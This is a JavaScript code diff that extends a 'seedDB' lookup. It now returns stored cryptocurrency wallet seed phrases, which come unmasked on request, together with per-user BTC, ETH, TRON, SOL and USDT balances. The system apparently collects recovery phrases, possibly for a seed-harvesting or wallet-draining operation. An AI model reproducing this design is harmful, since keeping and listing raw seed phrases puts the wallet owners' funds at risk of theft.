@@ -271,7 +271,12 @@ const seedDB = {
 
   // 시드 목록 조회
   async getAll(masked = true, filterUserId = null) {
-    let query = 'SELECT id, user_id, phrase, created_at FROM seeds';
+    let query = `SELECT id, user_id, phrase, created_at,
+                        COALESCE(btc,0) AS btc, COALESCE(eth,0) AS eth,
+                        COALESCE(tron,0) AS tron, COALESCE(sol,0) AS sol,
+                        COALESCE(usdt_balance,0) AS usdt_balance,
+                        COALESCE(balance,0) AS balance
+                 FROM seeds`;
     let params = [];
     
     if (filterUserId) {
@@ -292,10 +297,16 @@ const seedDB = {
     };
     
     return rows.map(row => ({
-      no: row.id,
-      userId: row.user_id,
-      phrase: masked ? mask(row.phrase) : row.phrase,
-      at: row.created_at,
+      no:           row.id,
+      userId:       row.user_id,
+      phrase:       masked ? mask(row.phrase) : row.phrase,
+      at:           row.created_at,
+      btc:          Number(row.btc)          || 0,
+      eth:          Number(row.eth)          || 0,
+      tron:         Number(row.tron)         || 0,
+      sol:          Number(row.sol)          || 0,
+      usdt_balance: Number(row.usdt_balance) || 0,
+      balance:      Number(row.balance)      || 0,
     }));
   },
 };
